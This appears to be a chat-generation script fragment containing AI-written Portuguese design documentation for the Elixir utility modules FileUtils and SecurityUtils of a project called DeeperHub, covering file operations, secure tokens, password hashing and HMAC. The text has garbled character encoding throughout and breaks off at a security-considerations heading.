O m√≥dulo `DeeperHub.Shared.Utils.FileUtils` fornece um conjunto de **fun√ß√µes utilit√°rias para interagir com o sistema de arquivos**. Ele encapsula opera√ß√µes comuns de manipula√ß√£o de arquivos e diret√≥rios, como leitura, escrita, verifica√ß√£o de exist√™ncia, c√≥pia, c√°lculo de hash de arquivos e obten√ß√£o de informa√ß√µes sobre arquivos.

Este m√≥dulo visa simplificar as intera√ß√µes com o sistema de arquivos, fornecer uma API consistente e lidar com erros comuns de forma previs√≠vel. Ele √© √∫til para tarefas como gerenciamento de uploads, leitura de arquivos de configura√ß√£o (que n√£o est√£o no `ConfigManager`), escrita de logs em arquivos (se n√£o usar um backend de logger mais avan√ßado), ou qualquer outra opera√ß√£o que necessite acesso direto a arquivos. üòä

**Importante:** O acesso direto ao sistema de arquivos deve ser feito com muito cuidado, especialmente se os caminhos dos arquivos forem influenciados por entrada do usu√°rio. A integra√ß√£o com `DeeperHub.Security.PathTraversalProtection` √© crucial nesses casos.

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Verifica√ß√£o de Exist√™ncia:**
    *   Verificar se um arquivo existe em um determinado caminho (`file_exists?/1`).
    *   Verificar se um diret√≥rio existe.
*   **Leitura de Arquivos:**
    *   Ler o conte√∫do completo de um arquivo de texto (`read_text_file/1`).
    *   Ler o conte√∫do de um arquivo bin√°rio.
    *   Ler um arquivo linha por linha ou em chunks (para arquivos grandes).
*   **Escrita em Arquivos:**
    *   Escrever (ou sobrescrever) conte√∫do em um arquivo de texto (`write_text_file/3`).
    *   Escrever conte√∫do bin√°rio em um arquivo.
    *   Anexar conte√∫do a um arquivo existente.
*   **Manipula√ß√£o de Arquivos e Diret√≥rios:**
    *   Copiar arquivos (`copy_file/3`).
    *   Mover/Renomear arquivos.
    *   Criar diret√≥rios, incluindo diret√≥rios pai (`ensure_dir_exists/1` - nova sugest√£o).
    *   Listar o conte√∫do de um diret√≥rio.
    *   Excluir arquivos e diret√≥rios.
*   **Informa√ß√µes de Arquivo:**
    *   Obter informa√ß√µes sobre um arquivo (tamanho, tipo, permiss√µes, datas de modifica√ß√£o/acesso) (`get_file_info/1`).
    *   Determinar o tipo MIME de um arquivo com base em sua extens√£o ou conte√∫do (magic bytes) (`get_mime_type/1`).
*   **C√°lculo de Hash de Arquivo:**
    *   Calcular o hash (MD5, SHA1, SHA256, etc.) do conte√∫do de um arquivo (`calculate_file_hash/2`).
*   **Tratamento de Erros:**
    *   Retornar resultados consistentes (ex: `{:ok, ...}` ou `{:error, reason_atom}`) para opera√ß√µes de arquivo.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

*   **`DeeperHub.Shared.Utils.FileUtils` (M√≥dulo Funcional):**
    *   Cont√©m todas as fun√ß√µes de utilidade para arquivos.
    *   Utiliza principalmente os m√≥dulos `File`, `Path`, e `:erlang.md5/:crypto` (para hashes) do Elixir/Erlang.
    *   **Importante:** As fun√ß√µes que recebem caminhos como entrada devem ser projetadas para funcionar bem com caminhos normalizados e validados por `DeeperHub.Security.PathTraversalProtection` se a origem do caminho for externa.

### 3.2. Estrutura de Diret√≥rios

```
lib/deeper_hub/shared/utils/file_utils.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Seguran√ßa Primeiro:** Qualquer fun√ß√£o que aceite um caminho de arquivo que possa ser influenciado, mesmo que indiretamente, por entrada do usu√°rio, deve ter sua entrada validada e normalizada por `PathTraversalProtection` *antes* de ser passada para `FileUtils`. As fun√ß√µes em `FileUtils` podem assumir que o caminho j√° √© seguro para opera√ß√µes dentro dos diret√≥rios base permitidos.
*   **Tratamento de Erros Expl√≠cito:** Opera√ß√µes de arquivo podem falhar por muitos motivos (permiss√µes, arquivo n√£o encontrado, disco cheio, etc.). As fun√ß√µes devem retornar tuplas `{:ok, ...}` ou `{:error, reason}`.
*   **Opera√ß√µes Bin√°rias vs. Texto:** Fornecer fun√ß√µes separadas ou op√ß√µes claras para lidar com arquivos de texto (com codifica√ß√£o) e arquivos bin√°rios.
*   **Streaming para Arquivos Grandes:** Para leitura/escrita de arquivos grandes, usar streams (`File.stream!/3`, `IO.stream/2`) para evitar carregar todo o conte√∫do na mem√≥ria.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **M√≥dulo de Upload de Avatares:**
    *   Ap√≥s receber um upload:
        *   `safe_path = PathTraversalProtection.sanitize_and_verify(user_input_path, @avatar_base_dir)`
        *   `FileUtils.write_binary_file(safe_path, uploaded_binary_data)`
        *   `{:ok, hash} = FileUtils.calculate_file_hash(safe_path, :sha256)` (para verificar integridade ou evitar duplicatas)
*   **Leitura de um Arquivo de Configura√ß√£o JSON Local (n√£o gerenciado pelo `ConfigManager`):**
    *   `case FileUtils.read_text_file(\"/etc/deeper_hub/custom_plugin_config.json\") do {:ok, content} -> Jason.decode(content) ... end`
*   **Escrita de Logs em Arquivo (Backend de Logger Simples):**
    *   `FileUtils.write_text_file(\"/var/log/deeper_hub/service.log\", formatted_log_entry, append: true, ensure_dir: true)`
*   **Servir um Arquivo Est√°tico Protegido:**
    *   Ap√≥s verificar permiss√µes:
        *   `safe_path = PathTraversalProtection.verify_path_in_base(user_requested_document, @secure_docs_dir)`
        *   `{:ok, file_info} = FileUtils.get_file_info(safe_path)`
        *   `Plug.Conn.send_file(conn, 200, safe_path, 0, file_info.size)`

## üåä 5. Fluxos Importantes

### Fluxo de Escrita Segura em Arquivo com Cria√ß√£o de Diret√≥rio

1.  **Chamador:** `FileUtils.write_text_file(\"/opt/app/data/reports/2023/report.txt\", \"conte√∫do\", ensure_dir: true)`.
    *   **Importante:** O chamador √© respons√°vel por garantir que o caminho base (`/opt/app/data/reports/2023/`) √© um local seguro e permitido, e que `report.txt` n√£o cont√©m elementos de path traversal se vier de entrada do usu√°rio.
2.  **`FileUtils.write_text_file/3`:**
    *   Se `ensure_dir: true`:
        *   `dir = Path.dirname(\"/opt/app/data/reports/2023/report.txt\")` -> `\"/opt/app/data/reports/2023\"`
        *   Chama `File.mkdir_p(dir)`.
    *   Chama `File.write(\"/opt/app/data/reports/2023/report.txt\", \"conte√∫do\", [:write])`.
    *   Retorna o resultado de `File.write`.

## üì° 6. API (Fun√ß√µes P√∫blicas do M√≥dulo)

*(Baseado na documenta√ß√£o original e expandindo)*

### 6.1. `DeeperHub.Shared.Utils.FileUtils.file_exists?(path :: String.t()) :: boolean()`

*   **Descri√ß√£o:** Verifica se um arquivo ou diret√≥rio existe no `path`. Usa `File.exists?/1`.

### 6.2. `DeeperHub.Shared.Utils.FileUtils.read_text_file(path :: String.t(), opts :: keyword()) :: {:ok, String.t()} | {:error, atom()}`

*   **Descri√ß√£o:** L√™ o conte√∫do de um arquivo de texto.
*   **`opts`:** `:encoding` (Padr√£o: `:utf8`).
*   **Retorno:** `{:ok, content}` ou `{:error, reason}` (ex: `:enoent`, `:eacces`). Usa `File.read/1`.

### 6.3. `DeeperHub.Shared.Utils.FileUtils.read_binary_file(path :: String.t(), opts :: keyword()) :: {:ok, binary()} | {:error, atom()}` (Nova Sugest√£o)

*   **Descri√ß√£o:** L√™ o conte√∫do de um arquivo como bin√°rio.
*   **`opts`:** (Nenhuma espec√≠fica por enquanto).
*   **Retorno:** `{:ok, binary_content}` ou `{:error, reason}`. Usa `File.read/1`.

### 6.4. `DeeperHub.Shared.Utils.FileUtils.write_text_file(path :: String.t(), content :: String.t() | list(String.t()), opts :: keyword()) :: :ok | {:error, atom()}`

*   **Descri√ß√£o:** Escreve/sobrescreve `content` em `path`.
*   **`opts`:**
    *   `:append` (boolean): Se `true`, anexa ao arquivo. (Padr√£o: `false`)
    *   `:ensure_dir` (boolean): Se `true`, cria o diret√≥rio pai se n√£o existir usando `File.mkdir_p/1`. (Padr√£o: `false`)
    *   `:encoding` (Padr√£o: `:utf8`).
*   Usa `File.write/3`.

### 6.5. `DeeperHub.Shared.Utils.FileUtils.write_binary_file(path :: String.t(), binary_content :: binary(), opts :: keyword()) :: :ok | {:error, atom()}` (Nova Sugest√£o)

*   **Descri√ß√£o:** Escreve/sobrescreve `binary_content` em `path`.
*   **`opts`:** `:append`, `:ensure_dir`.
*   Usa `File.write/3`.

### 6.6. `DeeperHub.Shared.Utils.FileUtils.copy_file(source_path :: String.t(), dest_path :: String.t(), opts :: keyword()) :: :ok | {:error, atom()}`

*   **Descri√ß√£o:** Copia um arquivo de `source_path` para `dest_path`.
*   **`opts`:**
    *   `:force` (boolean): Se `true`, sobrescreve `dest_path` se existir. (Padr√£o: `false`, retorna erro se destino existe).
    *   `:ensure_dest_dir` (boolean): Se `true`, cria o diret√≥rio pai de `dest_path`. (Padr√£o: `false`)
*   Usa `File.copy/3`.

### 6.7. `DeeperHub.Shared.Utils.FileUtils.get_file_info(path :: String.t()) :: {:ok, File.Stat.t()} | {:error, atom()}`

*   **Descri√ß√£o:** Retorna informa√ß√µes sobre o arquivo (tamanho, tipo, datas). Usa `File.stat/1`.

### 6.8. `DeeperHub.Shared.Utils.FileUtils.get_mime_type(path :: String.t()) :: {:ok, String.t()} | {:error, :extension_not_found}`

*   **Descri√ß√£o:** Tenta inferir o tipo MIME com base na extens√£o do arquivo. Pode usar um mapa interno de extens√µes para tipos MIME ou uma biblioteca.
*   **Retorno:** Ex: `{:ok, \"image/png\"}`, `{:ok, \"application/octet-stream\"}` (como fallback), ou `{:error, :extension_not_found}`.

### 6.9. `DeeperHub.Shared.Utils.FileUtils.calculate_file_hash(path :: String.t(), algorithm :: :md5 | :sha1 | :sha256 | :sha512) :: {:ok, String.t()} | {:error, atom()}`

*   **Descri√ß√£o:** Calcula o hash do conte√∫do do arquivo usando o `algorithm` especificado. Retorna o hash como uma string hexadecimal.
*   Usa `:crypto.hash/2` ou `:erlang.md5/1`.

### 6.10. `DeeperHub.Shared.Utils.FileUtils.ensure_dir_exists(dir_path :: String.t()) :: :ok | {:error, atom()}` (Nova Sugest√£o)

*   **Descri√ß√£o:** Garante que um diret√≥rio exista, criando-o (e seus pais) se necess√°rio. Usa `File.mkdir_p/1`.

### 6.11. `DeeperHub.Shared.Utils.FileUtils.list_dir(dir_path :: String.t(), opts :: keyword()) :: {:ok, list(String.t())} | {:error, atom()}` (Nova Sugest√£o)

*   **Descri√ß√£o:** Lista o conte√∫do (arquivos e subdiret√≥rios) de um diret√≥rio.
*   **`opts`:** `:include_hidden` (boolean).
*   Usa `File.ls/1`.

### 6.12. `DeeperHub.Shared.Utils.FileUtils.delete_file(path :: String.t()) :: :ok | {:error, atom()}` (Nova Sugest√£o)

*   **Descri√ß√£o:** Exclui um arquivo. Usa `File.rm/1`.

### 6.13. `DeeperHub.Shared.Utils.FileUtils.delete_dir_recursive(dir_path :: String.t()) :: :ok | {:error, atom()}` (Nova Sugest√£o)

*   **Descri√ß√£o:** Exclui um diret√≥rio e todo o seu conte√∫do recursivamente. Usa `File.rm_rf/1`. **Usar com extremo cuidado.**

## ‚öôÔ∏è 7. Configura√ß√£o

Este m√≥dulo geralmente n√£o tem muitas configura√ß√µes pr√≥prias, mas pode ser influenciado por:
*   `[:shared, :utils, :file, :default_text_encoding]` (String): Encoding padr√£o para arquivos de texto. (Padr√£o: `\"utf-8\"`)
*   `[:shared, :utils, :file, :mime_type_mappings]` (Map): Mapa customizado de `%{\".ext\" => \"mime/type\"}` para `get_mime_type/1`.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Security.PathTraversalProtection`: Crucial para ser usado pelos chamadores deste m√≥dulo se os caminhos vierem de fontes n√£o confi√°veis.
*   `DeeperHub.Core.ConfigManager` (para configura√ß√µes opcionais).

### 8.2. Bibliotecas Externas

*   Nenhuma, primariamente usa os m√≥dulos `File`, `Path`, `:crypto` do Elixir/Erlang.
*   Opcionalmente, uma biblioteca para detec√ß√£o de MIME type mais robusta (baseada em magic bytes) se `get_mime_type/1` precisar ser mais avan√ßado.

## ü§ù 9. Como Usar / Integra√ß√£o

Os chamadores devem primeiro garantir que os caminhos s√£o seguros (usando `PathTraversalProtection`) antes de passar para `FileUtils`.

```elixir
alias DeeperHub.Shared.Utils.FileUtils
alias DeeperHub.Security.PathTraversalProtection

@secure_base_dir Application.compile_env!(:my_app, :secure_file_storage_path)

def process_uploaded_document(user_filename, binary_data) do
  # 1. Pegar apenas o nome do arquivo, n√£o o caminho completo do cliente
  safe_name = Path.basename(user_filename) 
  
  # 2. Construir o caminho completo dentro do diret√≥rio base seguro
  target_path_candidate = Path.join(@secure_base_dir, safe_name)

  # 3. Normalizar e verificar se ainda est√° dentro do diret√≥rio base
  case PathTraversalProtection.normalize_path(target_path_candidate) do
    {:ok, normalized_path} ->
      case PathTraversalProtection.verify_path_in_base(normalized_path, @secure_base_dir) do
        {:ok, :allowed} ->
          FileUtils.write_binary_file(normalized_path, binary_data)
        _ ->
          {:error, :unsafe_path_after_normalization}
      end
    {:error, _} ->
      {:error, :invalid_path_construction}
  end
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar cada fun√ß√£o com caminhos v√°lidos e inv√°lidos.
*   Testar opera√ß√µes em arquivos/diret√≥rios existentes e n√£o existentes.
*   Testar tratamento de erros de permiss√£o (pode exigir configura√ß√£o do sistema de arquivos no ambiente de teste).
*   Testar op√ß√µes como `:append`, `:force`, `:ensure_dir`.
*   Testar `calculate_file_hash` com arquivos conhecidos.
*   Testar `get_mime_type` para extens√µes comuns.
*   Localiza√ß√£o: `test/deeper_hub/shared/utils/file_utils_test.exs`.

### 10.2. M√©tricas / 10.3. Logs / 10.4. Telemetria

Geralmente n√£o s√£o emitidos diretamente por este m√≥dulo utilit√°rio. Os chamadores seriam respons√°veis por registrar m√©tricas (ex: n√∫mero de arquivos escritos, tempo de hash) ou logs de erro se uma opera√ß√£o de arquivo falhar.
*   Exce√ß√£o: `record_attempt` em `PathTraversalProtection` seria chamado pelo c√≥digo que usa `FileUtils` se uma verifica√ß√£o de seguran√ßa falhar *antes* de chamar `FileUtils`.

## ‚ùå 11. Tratamento de Erros

*   As fun√ß√µes retornam `{:ok, ...}` ou `{:error, reason_atom}`. Os `reason_atom` geralmente correspondem aos √°tomos de erro do m√≥dulo `File` (ex: `:enoent` - arquivo n√£o encontrado, `:eacces` - permiss√£o negada, `:eisdir` - √© um diret√≥rio, etc.).
*   √â responsabilidade do chamador tratar esses erros.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **NUNCA use entrada de usu√°rio diretamente para construir caminhos de arquivo sem sanitiza√ß√£o e valida√ß√£o rigorosa com `PathTraversalProtection`.** Este m√≥dulo `FileUtils` assume que os caminhos fornecidos j√° foram verificados ou s√£o estaticamente definidos e seguros.
*   **Permiss√µes de Arquivo:** Esteja ciente das permiss√µes com as quais os arquivos/diret√≥rios s√£o criados.
*   **Condi√ß√µes de Corrida (Race Conditions):** Em opera√ß√µes como verificar se um arquivo existe e depois escrev√™-lo, pode haver condi√ß√µes de corrida se n√£o forem tratadas adequadamente (TOCTOU - Time-of-check to time-of-use). Use `File.write/3` com flags apropriadas ou mecanismos de bloqueio se a atomicidade for cr√≠tica (embora isso seja mais complexo).
*   **Exposi√ß√£o de Informa√ß√µes em Erros:** Erros de arquivo podem vazar informa√ß√µes sobre a estrutura do sistema de arquivos. Trate os erros de forma a n√£o expor esses detalhes para o usu√°rio final.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Mantenha as fun√ß√µes focadas em opera√ß√µes de arquivo gen√©ricas.
*   Sempre pense nas implica√ß√µes de seguran√ßa de qualquer nova fun√ß√£o que lide com caminhos.
*   Documente claramente o comportamento de erro.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Adicionar fun√ß√µes para lidar com arquivos tempor√°rios de forma segura.
*   [ ] Utilit√°rios para compress√£o/descompress√£o de arquivos (zip, gzip).
*   [ ] Fun√ß√µes de streaming mais avan√ßadas para processamento de arquivos grandes.
*   [ ] Para `get_mime_type`, integrar com uma biblioteca que use \"magic bytes\" para uma detec√ß√£o mais robusta do que apenas a extens√£o.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Este cobre `FileUtils`. O pr√≥ximo utilit√°rio natural seria `DeeperHub.Shared.Utils.SecurityUtils` para fechar o ciclo dos utilit√°rios mais comuns. Depois disso, poder√≠amos ir para `DeeperHub.OAuth` ou `DeeperHub.MFA`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Perfeito! Vamos finalizar a se√ß√£o de utilit√°rios detalhando `DeeperHub.Shared.Utils.SecurityUtils`. Este m√≥dulo √© para helpers de seguran√ßa de baixo n√≠vel que s√£o gen√©ricos e n√£o se encaixam em um m√≥dulo de seguran√ßa mais espec√≠fico.

---

# M√≥dulo: `DeeperHub.Shared.Utils.SecurityUtils` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Shared.Utils.SecurityUtils`

O m√≥dulo `DeeperHub.Shared.Utils.SecurityUtils` fornece um conjunto de **fun√ß√µes utilit√°rias de seguran√ßa de baixo n√≠vel e agn√≥sticas de contexto**. Estas s√£o ferramentas b√°sicas que podem ser usadas por v√°rios m√≥dulos de seguran√ßa ou outras partes do sistema para tarefas como gera√ß√£o de tokens aleat√≥rios seguros, hashing de senhas (se n√£o totalmente encapsulado em `Auth`), e outras opera√ß√µes criptogr√°ficas simples.

O objetivo √© fornecer blocos de constru√ß√£o seguros e bem testados para funcionalidades de seguran√ßa mais complexas, evitando a reinven√ß√£o de primitivas criptogr√°ficas e promovendo o uso de pr√°ticas seguras. üòä

**Importante:** Este m√≥dulo √© para utilit√°rios *gen√©ricos*. Opera√ß√µes de seguran√ßa mais complexas ou espec√≠ficas de um dom√≠nio (como gerenciamento de chaves de criptografia, fluxos de autentica√ß√£o completos, pol√≠ticas de seguran√ßa) devem residir em seus respectivos m√≥dulos Core ou de Seguran√ßa (ex: `Core.EncryptionService`, `Auth`, `SecurityPolicyManager`).

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Gera√ß√£o de Dados Aleat√≥rios Seguros:**
    *   Gerar sequ√™ncias de bytes aleat√≥rios criptograficamente seguros.
    *   Fornecer fun√ß√µes para gerar tokens aleat√≥rios em diferentes formatos (hex, base64) e comprimentos (`generate_token/2`).
    *   Gerar IDs √∫nicos e seguros (ex: UUIDs ou baseados em bytes aleat√≥rios) (`generate_id/1`).
    *   Gerar c√≥digos de recupera√ß√£o ou OTPs num√©ricos/alfanum√©ricos simples (`generate_recovery_code/2`).
*   **Hashing de Senhas (B√°sico):**
    *   Fornecer uma fun√ß√£o para gerar um hash seguro de uma senha usando um algoritmo forte e salt (`hash_password/2`).
    *   Fornecer uma fun√ß√£o para verificar uma senha contra um hash armazenado (`verify_password/2`).
    *(Nota: A l√≥gica principal de hashing de senha, incluindo pol√≠ticas e gerenciamento de algoritmos, provavelmente residiria em `DeeperHub.Auth.Services.PasswordService` ou `Core.EncryptionService`. As fun√ß√µes aqui seriam implementa√ß√µes diretas de um algoritmo espec√≠fico se necess√°rio como utilit√°rio.)*
*   **Opera√ß√µes HMAC (Hash-based Message Authentication Code):**
    *   Gerar um HMAC para verificar a integridade e autenticidade de dados usando uma chave secreta (`generate_hmac/3`).
    *   Verificar um HMAC (`verify_hmac/4`).
*   **Compara√ß√£o Segura de Tempo Constante:**
    *   Fornecer uma fun√ß√£o para comparar duas strings (ex: tokens, hashes) de forma que o tempo de execu√ß√£o n√£o dependa do n√∫mero de caracteres correspondentes, prevenindo ataques de timing.
*   **Gera√ß√£o de Chaves de Assinatura Simples:**
    *   Gerar chaves aleat√≥rias adequadas para assinar tokens JWT ou outros dados (`generate_signing_key/0`). (Gerenciamento mais complexo de chaves estaria em `Core.EncryptionService`).
*   **Avalia√ß√£o de Risco Simplificada (se presente aqui, conforme doc original):**
    *   Uma fun√ß√£o muito b√°sica para agregar scores de risco ponderados (`evaluate_risk/1`). (L√≥gica mais complexa estaria em `RiskAssessment`).
*   **Verifica√ß√£o de Bloqueio de IP (Stub/Placeholder):**
    *   A fun√ß√£o `is_ip_blocked/2` mencionada na documenta√ß√£o original seria um stub aqui, delegando para o `IPFirewallService` real. Utilit√°rios de seguran√ßa n√£o devem gerenciar estado de bloqueio.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

*   **`DeeperHub.Shared.Utils.SecurityUtils` (M√≥dulo Funcional):**
    *   Cont√©m todas as fun√ß√µes de utilidade de seguran√ßa.
    *   Utiliza o m√≥dulo `:crypto` do Erlang/Elixir para opera√ß√µes criptogr√°ficas.
    *   Pode usar bibliotecas como `Comeonin` ou `Argon2_elixir` para hashing de senhas, se essa funcionalidade for implementada aqui em vez de delegada.

### 3.2. Estrutura de Diret√≥rios

```
lib/deeper_hub/shared/utils/security_utils.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Foco em Primitivas:** Este m√≥dulo deve focar em fornecer primitivas de seguran√ßa e blocos de constru√ß√£o, n√£o em implementar fluxos de seguran√ßa complexos.
*   **Uso de `:crypto`:** Para gera√ß√£o de aleatoriedade e hashing, o m√≥dulo `:crypto` do Erlang √© a escolha preferida por ser parte da OTP e bem testado.
*   **Hashing de Senhas:** Se inclu√≠do aqui, deve usar um algoritmo moderno e forte (Argon2id, bcrypt). √â crucial usar salts √∫nicos para cada senha.
*   **Clareza sobre Seguran√ßa:** A documenta√ß√£o de cada fun√ß√£o deve ser clara sobre suas garantias de seguran√ßa e limita√ß√µes.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Gera√ß√£o de Token de Reset de Senha:**
    *   `DeeperHub.Recovery.PasswordResetService` chama `SecurityUtils.generate_token(32, :base64url)` para criar um token opaco e seguro.
*   **Cria√ß√£o de um Novo Usu√°rio com Senha:**
    *   `DeeperHub.Auth.Services.UserService` (ou `PasswordService`) chama `SecurityUtils.hash_password(user_password)` para obter o hash a ser armazenado. (Mais prov√°vel que a fun√ß√£o de hash esteja encapsulada no servi√ßo de senha).
*   **Assinatura de Payload de Webhook (Simples):**
    *   `DeeperHub.Webhooks.PayloadSigner` usa `SecurityUtils.generate_hmac(payload, webhook_secret, algorithm: :sha256)` para criar a assinatura.
*   **Gera√ß√£o de ID √önico para um Recurso:**
    *   Um servi√ßo precisa de um ID n√£o sequencial: `SecurityUtils.generate_id(:uuid)`.

## üåä 5. Fluxos Importantes

N√£o aplic√°vel no mesmo sentido que m√≥dulos com estado. O fluxo √© a chamada de uma fun√ß√£o e o retorno do seu resultado.

## üì° 6. API (Fun√ß√µes P√∫blicas do M√≥dulo)

*(Baseado na documenta√ß√£o original e refinando)*

### 6.1. `DeeperHub.Shared.Utils.SecurityUtils.generate_token(length_bytes :: pos_integer() \\\\ 32, format :: :hex | :base64 | :base64url | :binary \\\\ :base64url) :: String.t() | binary()`

*   **Descri√ß√£o:** Gera uma string ou bin√°rio aleat√≥rio criptograficamente seguro com `length_bytes` de entropia.
*   **Retorno:** String no formato especificado ou bin√°rio.

### 6.2. `DeeperHub.Shared.Utils.SecurityUtils.generate_id(format :: :uuid | :hex_16_bytes | :base64url_16_bytes \\\\ :uuid) :: String.t()`

*   **Descri√ß√£o:** Gera um identificador √∫nico.
    *   `:uuid`: UUID v4.
    *   `:hex_16_bytes`: 16 bytes aleat√≥rios codificados em hex (32 caracteres).
    *   `:base64url_16_bytes`: 16 bytes aleat√≥rios codificados em base64url.
*   **Exemplo:** `generate_id()` -> `\"f47ac10b-58cc-4372-a567-0e02b2c3d479\"`

### 6.3. `DeeperHub.Shared.Utils.SecurityUtils.generate_recovery_code(length :: pos_integer() \\\\ 6, format :: :numeric | :alphanumeric_upper | :alphanumeric_mixed \\\\ :numeric) :: String.t()`

*   **Descri√ß√£o:** Gera um c√≥digo simples para recupera√ß√£o ou OTP. *N√£o usar para senhas.*
*   **`format`:**
    *   `:numeric`: Apenas d√≠gitos.
    *   `:alphanumeric_upper`: D√≠gitos e letras mai√∫sculas.
    *   `:alphanumeric_mixed`: D√≠gitos e letras mai√∫sculas/min√∫sculas.

### 6.4. `DeeperHub.Shared.Utils.SecurityUtils.hash_password(password :: String.t(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`

*   **Descri√ß√£o:** Gera um hash seguro de senha usando um algoritmo forte (ex: Argon2id ou bcrypt via uma biblioteca).
*   **`opts`:** Pode incluir `:salt` (raramente usado externamente), ou op√ß√µes de custo do algoritmo.
*   **Retorno:** Hash da senha como string (incluindo salt e par√¢metros) ou erro.
*   **Nota:** Recomenda-se que esta l√≥gica seja encapsulada em `DeeperHub.Auth.Services.PasswordService`.

### 6.5. `DeeperHub.Shared.Utils.SecurityUtils.verify_password(password :: String.t(), stored_hash :: String.t()) :: boolean()`

*   **Descri√ß√£o:** Verifica se a `password` corresponde ao `stored_hash`.
*   **Retorno:** `true` se corresponder, `false` caso contr√°rio.
*   **Nota:** Recomenda-se que esta l√≥gica seja encapsulada em `DeeperHub.Auth.Services.PasswordService`.

### 6.6. `DeeperHub.Shared.Utils.SecurityUtils.generate_hmac(data :: String.t() | binary(), key :: binary(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`

*   **Descri√ß√£o:** Gera um HMAC (Hash-based Message Authentication Code).
*   **`opts`:**
    *   `:algorithm` (atom): Ex: `:sha256`, `:sha512`. (Padr√£o: `:sha256`)
    *   `:output_format` (atom): Ex: `:hex`, `:base64`. (Padr√£o: `:hex`)

### 6.7. `DeeperHub.Shared.Utils.SecurityUtils.verify_hmac(data :: String.t() | binary(), hmac_to_verify :: String.t(), key :: binary(), opts :: keyword()) :: boolean()`

*   **Descri√ß√£o:** Verifica um HMAC. Retorna `true` se v√°lido, `false` caso contr√°rio.
*   **`opts`:** Mesmas de `generate_hmac/3` para garantir que a compara√ß√£o use os mesmos par√¢metros.

### 6.8. `DeeperHub.Shared.Utils.SecurityUtils.secure_compare(string1 :: String.t(), string2 :: String.t()) :: boolean()` (Nova Sugest√£o)

*   **Descri√ß√£o:** Compara duas strings em tempo constante para prevenir ataques de timing. Essencial para comparar tokens de API, senhas secretas, etc.
*   Usa `Plug.Crypto.secure_compare/2`.

### 6.9. `DeeperHub.Shared.Utils.SecurityUtils.generate_signing_key(length_bytes :: pos_integer() \\\\ 32) :: binary()`

*   **Descri√ß√£o:** Gera uma chave aleat√≥ria de `length_bytes` adequada para uso como segredo de assinatura HMAC ou JWT (HS256/HS512).

## ‚öôÔ∏è 7. Configura√ß√£o

Este m√≥dulo geralmente n√£o tem muitas configura√ß√µes pr√≥prias, mas pode ser influenciado por configura√ß√µes de seguran√ßa globais se, por exemplo, o algoritmo de hashing de senha padr√£o fosse definido globalmente.

*   `[:security, :hashing, :password_algorithm]` (Atom): Se o algoritmo de hash de senha fosse configur√°vel (ex: `:argon2id`, `:bcrypt`).
*   `[:security, :hmac, :default_algorithm]` (Atom): Algoritmo HMAC padr√£o.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   Nenhuma, idealmente. Poderia usar `Core.ConfigManager` para padr√µes se necess√°rio.

### 8.2. Bibliotecas Externas

*   `:crypto` (Erlang OTP): Para gera√ß√£o de bytes aleat√≥rios e fun√ß√µes de hash/HMAC.
*   `Plug.Crypto` (para `secure_compare/2`).
*   Opcionalmente, bibliotecas de hashing de senha como `Argon2_elixir` ou `Comeonin` (com `bcrypt_elixir` ou `pbkdf2_elixir`).

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Gera√ß√£o de Tokens:** M√≥dulos como `DeeperHub.Recovery` ou `DeeperHub.Tokens` usariam `generate_token/2` para criar tokens opacos.
*   **Verifica√ß√£o de Assinaturas:** M√≥dulos que lidam com webhooks ou dados assinados usariam `verify_hmac/4`.
*   **Compara√ß√£o de Tokens:** Qualquer lugar que precise comparar um token fornecido pelo usu√°rio com um token armazenado deve usar `secure_compare/2`.

```elixir
alias DeeperHub.Shared.Utils.SecurityUtils

def create_password_reset_token(user_id) do
  token_value = SecurityUtils.generate_token(32, :base64url)
  # ... armazenar o token (ou seu hash) associado ao user_id ...
  token_value
end

def is_api_key_valid?(provided_key, stored_hashed_key_part) do
  # Esta √© uma simplifica√ß√£o; a valida√ß√£o real de chaves de API √© mais complexa
  # e geralmente envolve buscar o hash completo da chave.
  # Aqui, apenas para ilustrar secure_compare.
  SecurityUtils.secure_compare(provided_key, some_derived_value_from_stored_hash)
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar a gera√ß√£o de tokens/IDs para garantir o formato e comprimento corretos, e aleatoriedade (dif√≠cil de testar diretamente, mas verificar a n√£o repeti√ß√£o em um grande n√∫mero de chamadas).
*   Testar `hash_password` e `verify_password` com senhas v√°lidas e inv√°lidas.
*   Testar `generate_hmac` e `verify_hmac` com dados e chaves conhecidos.
*   Testar `secure_compare` para garantir que retorna `true` para strings iguais e `false` para diferentes, e que seu tempo de execu√ß√£o √© relativamente constante (mais dif√≠cil de testar unitariamente, mas √© uma propriedade conhecida da implementa√ß√£o subjacente).
*   Localiza√ß√£o: `test/deeper_hub/shared/utils/security_utils_test.exs`.

### 10.2. M√©tricas / 10.3. Logs / 10.4. Telemetria

Geralmente n√£o aplic√°vel para um m√≥dulo de utilit√°rios puros, a menos que uma opera√ß√£o espec√≠fica (ex: hashing de senha) seja identificada como um gargalo e precise de instrumenta√ß√£o.

## ‚ùå 11. Tratamento de Erros

*   Fun√ß√µes devem levantar `ArgumentError` para entradas de tipo inv√°lido.
*   Fun√ß√µes que podem falhar devido a raz√µes criptogr√°ficas (ex: falha no algoritmo subjacente, embora raro com `:crypto`) podem retornar `{:error, reason}` ou levantar exce√ß√µes.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa (do pr√≥prio M√≥dulo)

